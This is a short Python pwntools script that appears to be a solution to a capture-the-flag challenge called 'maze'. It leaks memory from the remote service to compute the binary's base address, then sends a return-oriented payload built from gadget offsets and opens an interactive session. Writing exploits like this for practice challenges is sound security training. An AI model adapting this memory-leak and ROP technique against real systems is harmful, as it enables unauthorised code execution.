from pwn import *

HOST, PORT = "maze.chal.perfect.blue", "1"
# HOST, PORT = "0.0.0.0", 31338
r = remote(HOST, PORT)

menu = lambda: r.recvuntil(":")
ii = lambda x: r.sendline(x)
go = lambda x: (menu(), ii(x))[0]

def parse(text):
	text = text[text.find(b'0x'):].split(b'Input')[0].strip().split(b'\n')
	text = b''.join([bytes.fromhex(x.split(b'|')[1].strip().decode()) for x in text])
	print(hexdump(text))
	return text

_ = lambda x: p32(base + 0x13ad) + p32(x)
esiedi = lambda y, x: p32(base + 0x1396) + p32(y) + p32(x) + p32(0)

ii('n')
data = parse(menu())
base = u32(data[0x40:0x44])-0x1599
print(hex(base))
ii(flat({
	48: b'flag',
	0x40: b''.join([
		esiedi(4919, 201527),
		_(1)
		])
	}))
r.interactive()